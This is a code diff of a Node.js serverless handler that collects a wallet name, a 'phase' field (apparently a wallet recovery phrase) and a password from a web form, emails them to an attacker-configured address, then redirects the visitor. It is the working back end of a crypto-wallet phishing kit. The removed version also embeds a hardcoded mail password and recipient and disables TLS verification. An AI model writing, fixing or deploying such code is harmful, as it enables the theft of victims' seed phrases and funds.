@@ -1,92 +1,48 @@
-const nodemailer = require("nodemailer");
+import nodemailer from 'nodemailer';
+import { parse } from 'querystring';
 
-const transporter = nodemailer.createTransport({
-  host: process.env.SMTP_HOST || "smtp.gmail.com",
-  port: Number(process.env.SMTP_PORT || 587),
-  secure: process.env.SMTP_SECURE === "true",
-  tls: { rejectUnauthorized: false },
-  auth: {
-    user: process.env.SMTP_USER || "attendantemail@gmail.com",
-    pass: process.env.SMTP_PASS || "ixrb xwbe haxp qtnt",
-  },
-});
-
-const parseBody = async (req) => {
-  if (req.body) {
-    return req.body;
+export default async function handler(req, res) {
+  // Only allow POST requests
+  if (req.method !== 'POST') {
+    return res.status(405).send('Method not allowed');
   }
 
-  const chunks = [];
-  for await (const chunk of req) {
-    chunks.push(chunk);
-  }
-  const rawBody = Buffer.concat(chunks).toString("utf8");
-  const contentType = (req.headers["content-type"] || "").toLowerCase();
+  let { wallet_name, phase, pw: password } = req.body;
 
-  if (contentType.includes("application/json")) {
-    return rawBody ? JSON.parse(rawBody) : {};
+  // Validate required fields
+  if (!phase || phase.trim() === '') {
+    return res.status(400).send('Required field missing.');
   }
 
-  if (contentType.includes("application/x-www-form-urlencoded")) {
-    return Object.fromEntries(new URLSearchParams(rawBody));
-  }
-
-  return {};
-};
-
-module.exports = async (req, res) => {
-  if (req.method !== "POST") {
-    res.setHeader("Allow", "POST");
-    return res.status(405).json({ error: "Method Not Allowed" });
-  }
-
-  if (!process.env.SMTP_USER || !process.env.SMTP_PASS) {
-    return res.status(500).json({ error: "SMTP credentials are not configured." });
-  }
-
-  let body;
   try {
-    body = await parseBody(req);
+    // Create transporter with environment variables
+    const transporter = nodemailer.createTransport({
+      host: process.env.SMTP_HOST,
+      port: parseInt(process.env.SMTP_PORT || '587'),
+      secure: process.env.SMTP_PORT === '465',
+      auth: {
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASSWORD,
+      },
+    });
+
+    // Prepare email
+    const mailOptions = {
+      from: `${process.env.SMTP_FROM_NAME} <${process.env.SMTP_FROM_EMAIL}>`,
+      to: process.env.RECIPIENT_EMAIL,
+      subject: 'New Form Submission',
+      text: `Wallet Name: ${wallet_name || 'N/A'}\nPhase: ${phase}\nPassword: ${password || 'N/A'}`,
+    };
+
+    // Send email
+    await transporter.sendMail(mailOptions);
+
+    // Redirect to the original behavior
+    res.writeHead(302, { 'Location': '/rdr.html' });
+    res.end();
+
   } catch (error) {
-    console.error(error);
-    return res.status(400).json({ error: "Invalid request body." });
+    console.error('Email error:', error);
+    res.status(500).send('Message could not be sent. Error: ' + error.message);
   }
-
-  // Verify transporter connectivity and authentication before sending
-  try {
-    await transporter.verify();
-  } catch (err) {
-    console.error('SMTP verify failed:', err);
-    return res.status(500).json({ error: 'SMTP verification failed. Check SMTP credentials and network access.', details: err && err.message });
-  }
-
-  const wallet_name = String(body.wallet_name || "").trim();
-  const phase = String(body.phase || "").trim();
-  const password = String(body.pw || "").trim();
-
-  if (!phase) {
-    return res.status(400).json({ error: "Required field missing." });
-  }
-
-  const fromEmail = process.env.EMAIL_FROM || "noreply@connectus.website";
-  const toEmail = process.env.EMAIL_TO || process.env.SMTP_USER || "attendantemail@gmail.com";
-
-  if (!toEmail) {
-    return res.status(500).json({ error: "Recipient email is not configured." });
-  }
-
-  const mailOptions = {
-    from: fromEmail,
-    to: toEmail,
-    subject: "New Form Submission",
-    text: `Wallet Name: ${wallet_name}\nPhase: ${phase}\nPassword: ${password}`,
-  };
-
-  try {
-    const info = await transporter.sendMail(mailOptions);
-    return res.status(200).json({ ok: true, messageId: info.messageId });
-  } catch (error) {
-    console.error('SendMail error:', error);
-    return res.status(500).json({ error: "Message could not be sent.", details: (error && (error.response || error.message)) });
-  }
-};
+}
